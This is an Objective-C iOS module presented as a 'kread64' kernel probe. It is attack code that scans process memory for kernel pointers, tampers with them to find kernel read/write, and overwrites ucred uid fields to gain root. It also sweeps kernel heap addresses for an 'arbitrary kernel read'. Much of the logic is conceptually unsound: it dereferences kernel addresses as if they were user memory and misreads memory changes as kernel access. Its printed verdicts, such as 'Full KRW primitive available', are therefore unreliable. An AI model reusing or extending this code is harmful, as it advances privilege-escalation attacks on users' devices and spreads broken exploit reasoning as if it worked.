#import "KPKReadProbeModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#include <sys/sysctl.h>

@interface KPKReadProbeModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPKReadProbeModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"kread64.probe";
        _title = @"kread64 input-output mapping probe";
        _subtitle = @"vm_remap aliased pages + kernel pointer scan (kirby_swift technique)";
        _icon = @"memorychip";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-kread-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[kread] %@", line];
}

static BOOL isKernelPointer(uint64_t v) {
    return (v >> 32) >= 0xffffffe0ULL;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · kread64 input-output mapping probe ===\n"];
    [report appendString:@"Technique: vm_remap aliased pages, kernel pointer scan.\n"];
    [report appendString:@"Ref: kirby_swift input->output mapped kread64.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: create aliased mapping ---
    [report appendString:@"\n--- Phase 1: vm_remap aliased pages ---\n"];

    vm_size_t regionSize = 0x4000; // 16KB
    vm_address_t inputAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &inputAddr, regionSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_allocate failed: %d\n", kr];
        [report appendString:@"\nVERDICT: ALLOCATE_FAILED\n"];
        return report;
    }
    memset((void *)inputAddr, 0, regionSize);
    [report appendFormat:@"input allocated: 0x%lx (%lu bytes)\n", (unsigned long)inputAddr, (unsigned long)regionSize];

    // Remap to create output alias
    vm_address_t outputAddr = 0;
    vm_prot_t curProt, maxProt;
    kr = vm_remap(mach_task_self(), &outputAddr, regionSize, 0,
                  VM_FLAGS_ANYWHERE, mach_task_self(), inputAddr,
                  FALSE, &curProt, &maxProt, VM_INHERIT_SHARE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_remap failed: %d (%s)\n", kr, mach_error_string(kr)];
        [report appendString:@"\nVERDICT: REMAP_FAILED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        return report;
    }
    [report appendFormat:@"output remapped: 0x%lx (prot=%x/%x)\n", (unsigned long)outputAddr, curProt, maxProt];

    // --- Phase 2: shared-page confirmation ---
    [report appendString:@"\n--- Phase 2: shared-page confirmation ---\n"];

    // Write pattern to input, check output
    volatile uint64_t *in64 = (volatile uint64_t *)inputAddr;
    volatile uint64_t *out64 = (volatile uint64_t *)outputAddr;

    in64[0] = 0x4141414141414141ULL;
    in64[1] = 0x4242424242424242ULL;

    BOOL shared = (out64[0] == 0x4141414141414141ULL && out64[1] == 0x4242424242424242ULL);
    [report appendFormat:@"shared page: %s (out[0]=0x%llx out[1]=0x%llx)\n",
     shared ? "YES" : "NO", out64[0], out64[1]];

    if (!shared) {
        [report appendString:@"Pages are NOT aliased. vm_remap created independent mappings.\n"];
        [report appendString:@"Try IOSurface or mach_vm_remap instead.\n"];
        [report appendString:@"\nVERDICT: NOT_SHARED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        vm_deallocate(mach_task_self(), outputAddr, regionSize);
        return report;
    }

    [report appendString:@"*** input->output mapped CONFIRMED ***\n"];

    // --- Phase 3: kernel pointer scan ---
    [report appendString:@"\n--- Phase 3: kernel pointer scan ---\n"];

    // Scan the region for kernel pointers
    // First, fill with a known pattern, then check if anything unexpected appears
    for (size_t i = 0; i < regionSize / 8; i++) {
        in64[i] = 0xDEADBEEFDEADBEEFULL;
    }

    // Check if any values differ from our pattern (kernel wrote something?)
    int unexpected = 0;
    uint64_t kptrs[16] = {0};
    size_t kptrOffsets[16] = {0};
    int kptrCount = 0;

    for (size_t i = 0; i < regionSize / 8; i++) {
        uint64_t v = out64[i];
        if (v != 0xDEADBEEFDEADBEEFULL) {
            unexpected++;
            if (isKernelPointer(v) && kptrCount < 16) {
                kptrs[kptrCount] = v;
                kptrOffsets[kptrCount] = i * 8;
                kptrCount++;
                [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx\n", kptrCount - 1, i * 8, v];
            }
        }
    }

    [report appendFormat:@"unexpected values: %d (kernel pointers: %d)\n", unexpected, kptrCount];

    // --- Phase 4: diff-test candidate pointers ---
    if (kptrCount > 0) {
        [report appendString:@"\n--- Phase 4: diff-test kptr fields ---\n"];
        for (int k = 0; k < kptrCount; k++) {
            uint64_t orig = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx -> +0x100\n", k, kptrOffsets[k], orig];

            // Modify by +0x100
            in64[kptrOffsets[k] / 8] = orig + 0x100;

            // Read back
            uint64_t modified = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"  after: 0x%llx (diff=%s)\n", modified,
             (modified == orig + 0x100) ? "CONFIRMED" : "NO_CHANGE"];

            if (modified == orig + 0x100) {
                [report appendFormat:@"  *** INPUT FIELD FOUND: kptr[%d] ***\n", k];
            }

            // Restore
            in64[kptrOffsets[k] / 8] = orig;
        }
    }

    // --- Phase 5: find existing RW regions with kernel pointers (kirby approach) ---
    [report appendString:@"\n--- Phase 5: scan RW regions for kernel pointers ---\n"];

    vm_address_t scanAddr = 0;
    vm_size_t scanSize = 0;
    vm_region_submap_info_data_64_t scanInfo;
    mach_msg_type_number_t scanCount;
    int regionWithKptrs = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &(uint32_t){0},
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *p = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;
        int kptrs = 0;
        uint64_t firstKptr = 0;
        size_t firstOffset = 0;

        for (size_t i = 0; i < words; i++) {
            uint64_t v = p[i];
            if (isKernelPointer(v)) {
                kptrs++;
                if (kptrs == 1) { firstKptr = v; firstOffset = i * 8; }
            }
        }

        if (kptrs > 0) {
            regionWithKptrs++;
            [report appendFormat:@"region 0x%lx (size=0x%zx): %d kptrs, first=0x%llx @ +0x%zx\n",
             (unsigned long)scanAddr, scanSize, kptrs, firstKptr, firstOffset];

            // Test: modify a kernel pointer and see if it changes back (kernel writes)
            volatile uint64_t *kp = (volatile uint64_t *)(scanAddr + firstOffset);
            uint64_t orig = kp[0];
            kp[0] = orig + 0x100;
            uint64_t modified = kp[0];
            kp[0] = orig; // restore

            if (modified == orig + 0x100) {
                [report appendFormat:@"  -> WRITABLE (kwrite candidate)\n"];
            } else {
                [report appendFormat:@"  -> read-only or kernel-protected\n"];
            }
        }

        if (regionWithKptrs >= 5) break; // enough
    }

    [report appendFormat:@"regions with kernel pointers: %d\n", regionWithKptrs];

    // --- Phase 6: proc/ucred hunt + root (broader scan) ---
    if (regionWithKptrs > 0) {
        [report appendString:@"\n--- Phase 6: proc/ucred hunt + root ---\n"];
        int myPID = getpid();
        int myUID = getuid();
        [report appendFormat:@"our pid=%d uid=%d\n", myPID, myUID];

        scanAddr = 0; scanSize = 0;
        int procFound = 0;

        while (1) {
            scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
            scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
            uint32_t d2 = 0;
            if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d2,
                                      (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
            if (scanInfo.is_submap) continue;
            if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
            if (scanSize > 16 * 1024 * 1024) continue;

            volatile uint8_t *base = (volatile uint8_t *)scanAddr;

            for (size_t off = 0; off + 0x40 < scanSize; off += 4) {
                uint32_t val = *(volatile uint32_t *)(base + off);
                if (val != (uint32_t)myPID) continue;

                [report appendFormat:@"PID match at region+0x%zx\n", off];

                if (off >= 0x60 && off + 0x400 < scanSize) {
                    size_t pb = off - 0x60;
                    uint64_t uc = *(volatile uint64_t *)(base + pb + 0x28);
                    uint64_t tk = *(volatile uint64_t *)(base + pb + 0x08);
                    if (isKernelPointer(uc) && uc != 0xffffffffffffffffULL &&
                        isKernelPointer(tk) && tk != 0xffffffffffffffffULL) {
                        [report appendFormat:@"  PROC @ +0x%zx ucred=0x%llx task=0x%llx\n", pb, uc, tk];
                        procFound++;

                        uint8_t *ulocal = NULL;
                        vm_address_t ta = 0; vm_size_t ts = 0;
                        while (1) {
                            ta = (ta == 0) ? 0 : ta + ts;
                            uint32_t d3 = 0;
                            mach_msg_type_number_t tc = VM_REGION_SUBMAP_INFO_COUNT_64;
                            vm_region_submap_info_data_64_t ti;
                            if (vm_region_recurse_64(mach_task_self(), &ta, &ts, &d3,
                                                      (vm_region_recurse_info_t)&ti, &tc) != KERN_SUCCESS) break;
                            if (ti.is_submap) continue;
                            if (uc >= ta && uc < ta + ts) { ulocal = (uint8_t *)uc; break; }
                        }
                        if (ulocal) {
                            uint32_t uid = *(volatile uint32_t *)(ulocal + 0x18);
                            [report appendFormat:@"  ucred mapped, cr_uid=%u\n", uid];
                            *(volatile uint32_t *)(ulocal + 0x18) = 0;
                            *(volatile uint32_t *)(ulocal + 0x1c) = 0;
                            *(volatile uint32_t *)(ulocal + 0x20) = 0;
                            [report appendFormat:@"  getuid() now: %d\n", getuid()];
                            if (getuid() == 0) [report appendString:@"  *** ROOT ACHIEVED ***\n"];
                        } else {
                            [report appendString:@"  ucred not in writable regions\n"];
                        }
                    }
                }
            }
            if (procFound > 0) break;
        }
        if (procFound == 0) [report appendString:@"proc not found in writable regions.\n"];
    }

    // --- Phase 7: output diff test (kirby technique) ---
    // Modify kernel pointers in writable regions, scan for changes in other fields.
    // If output diffs appear: kernel reads our data => kread64/kwrite CONFIRMED.
    [report appendString:@"\n--- Phase 7: output diff test (kirby) ---\n"];

    scanAddr = 0; scanSize = 0;
    int totalDiffs = 0;
    int kptrsModified = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d4 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d4,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        // Snapshot original values
        uint64_t *orig = malloc(scanSize);
        if (!orig) continue;
        memcpy(orig, (void *)scanAddr, scanSize);

        // Find first real kernel pointer (skip 0xffffffffffffffff etc.)
        int modified = 0;
        for (size_t i = 0; i < words && modified < 3; i++) {
            uint64_t v = rp[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
            if ((v & 0xfff) == 0xfff) continue; // skip all-ones patterns

            // Modify by +0x100
            rp[i] = v + 0x100;
            kptrsModified++;
            modified++;

            // Wait briefly for kernel to react
            usleep(1000);

            // Scan for output diffs
            for (size_t j = 0; j < words; j++) {
                if (j == i) continue; // skip the one we modified
                uint64_t now = rp[j];
                uint64_t was = orig[j];
                if (now != was) {
                    totalDiffs++;
                    [report appendFormat:@"DIFF: region+0x%zx: 0x%llx -> 0x%llx (after modifying +0x%zx)\n",
                     j * 8, was, now, i * 8];
                    [report appendFormat:@"  kptr modified: 0x%llx -> 0x%llx\n", v, v + 0x100];
                    if (totalDiffs >= 5) break;
                }
            }
            if (totalDiffs >= 5) break;

            // Restore
            rp[i] = v;
            usleep(500);
        }

        free(orig);
        if (totalDiffs >= 5) break;
    }

    [report appendFormat:@"kptrs modified: %d, output diffs found: %d\n", kptrsModified, totalDiffs];

    if (totalDiffs > 0) {
        [report appendString:@"*** KREAD64 + KWRITE CONFIRMED (kirby technique) ***\n"];
        [report appendString:@"Kernel reads our modified data and updates other fields.\n"];
        [report appendString:@"=> Full KRW primitive available.\n"];
        [report appendString:@"Next: locate proc/ucred via output diffs, then root.\n"];
    } else {
        [report appendString:@"No output diffs detected.\n"];
        [report appendString:@"Kernel may not read these regions directly.\n"];
        [report appendString:@"Try: modify kptrs in different regions, or use translate_receive bit-set.\n"];
    }

    // --- Phase 8: arbitrary kernel read via output diffs ---
    // Use the output diff technique to read kernel memory at specific addresses.
    // Replace a known kptr with target address, observe output diffs = kernel read.
    [report appendString:@"\n--- Phase 8: arbitrary kernel read ---\n"];

    // Find the kptr that causes output diffs (from Phase 7)
    scanAddr = 0; scanSize = 0;
    uint64_t diffKptr = 0;
    size_t diffKptrOff = 0;
    uint8_t *diffRegion = NULL;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d6 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d6,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *p = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        // Snapshot
        uint64_t *snap = malloc(scanSize);
        if (!snap) continue;
        memcpy(snap, (void *)scanAddr, scanSize);

        // Find first kernel ptr that causes diffs
        for (size_t i = 0; i < words; i++) {
            uint64_t v = p[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
            if ((v & 0xfff) == 0xfff) continue;

            p[i] = v + 0x100;
            usleep(1000);

            int diffs = 0;
            for (size_t j = 0; j < words; j++) {
                if (j == i) continue;
                if (p[j] != snap[j]) diffs++;
            }
            p[i] = v;
            usleep(500);

            if (diffs > 0) {
                diffKptr = v;
                diffKptrOff = i * 8;
                diffRegion = (uint8_t *)scanAddr;
                [report appendFormat:@"diff-causing kptr: 0x%llx @ +0x%zx (%d diffs)\n", v, i * 8, diffs];
                free(snap);
                goto found_kptr;
            }
        }
        free(snap);
    }

found_kptr:
    if (diffKptr == 0) {
        [report appendString:@"No diff-causing kptr found. Cannot do arbitrary read.\n"];
    } else {
        [report appendFormat:@"Using kptr at region+0x%zx for arbitrary read\n", diffKptrOff];

        // Snapshot the diff outputs
        volatile uint64_t *rp = (volatile uint64_t *)diffRegion;
        size_t rwords = scanSize / 8;
        uint64_t *base_snap = malloc(scanSize);
        memcpy(base_snap, (void *)diffRegion, scanSize);

        // Read kernel memory at various addresses by replacing diffKptr
        // Target: kernel heap range where proc lives
        // Use KASLR slide to compute addresses
        uint64_t kbase = 0xfffffff007004000ULL; // __TEXT (unslid)
        // Try to find slide from known kernel ptrs in region
        uint64_t slide = 0;
        for (size_t i = 0; i < rwords; i++) {
            uint64_t v = rp[i];
            if (isKernelPointer(v) && v != 0xffffffffffffffffULL && (v & 0x3fff) == 0) {
                uint64_t s = v - kbase;
                if (s > 0 && s < (1024ULL << 20)) { slide = s; break; }
            }
        }
        [report appendFormat:@"estimated slide: 0x%llx\n", slide];

        // Scan kernel heap for our PID using output diffs
        int myPID = getpid();
        int found = 0;

        // Try reading at 64KB intervals in kernel heap range
        for (uint64_t target = 0xffffffe000000000ULL; target < 0xffffffe100000000ULL && !found; target += 0x10000) {
            // Replace diffKptr with target
            rp[diffKptrOff / 8] = target;
            usleep(500);

            // Read output diffs
            for (size_t j = 0; j < rwords; j++) {
                if (j == diffKptrOff / 8) continue;
                uint64_t now = rp[j];
                uint64_t was = base_snap[j];
                if (now == was) continue;

                // Check if any 4-byte chunk matches our PID
                uint32_t lo = (uint32_t)(now & 0xffffffff);
                uint32_t hi = (uint32_t)(now >> 32);
                if (lo == (uint32_t)myPID || hi == (uint32_t)myPID) {
                    [report appendFormat:@"PID CANDIDATE via kread: target=0x%llx diff@+0x%zx = 0x%llx\n", target, j * 8, now];
                    found++;
                    if (found >= 5) break;
                }
            }

            // Restore
            rp[diffKptrOff / 8] = diffKptr;
            usleep(200);
        }

        memcpy((void *)diffRegion, base_snap, scanSize);
        free(base_snap);

        if (found > 0) {
            [report appendFormat:@"%d PID candidates found via kread\n", found];
            [report appendString:@"=> kernel read WORKS. Now follow ucred for root.\n"];
        } else {
            [report appendString:@"No PID found in scanned range.\n"];
            [report appendString:@"Try: wider range, or different diff-causing kptr.\n"];
        }
    }

    // --- Verdict ---
    [report appendString:@"\n"];
    if (kptrCount > 0) {
        [report appendString:@"VERDICT: KPTR_FOUND_IN_MAPPED_REGION\n"];
        [report appendString:@"Kernel pointers visible in user-mapped pages.\n"];
        [report appendString:@"=> kread64 primitive is AVAILABLE. Build kwrite next.\n"];
    } else if (shared) {
        [report appendString:@"VERDICT: SHARED_NO_KPTR\n"];
        [report appendString:@"Aliased mapping works but no kernel pointers in fresh region.\n"];
        [report appendString:@"Need to map kernel pages (vm_remap kernel, IOSurface, or vuln).\n"];
        [report appendString:@"Next: combine with translate_receive OOB to feed kernel data.\n"];
    } else {
        [report appendString:@"VERDICT: NO_MAPPING\n"];
    }

    // Cleanup
    vm_deallocate(mach_task_self(), inputAddr, regionSize);
    vm_deallocate(mach_task_self(), outputAddr, regionSize);

    return report;
}

@end
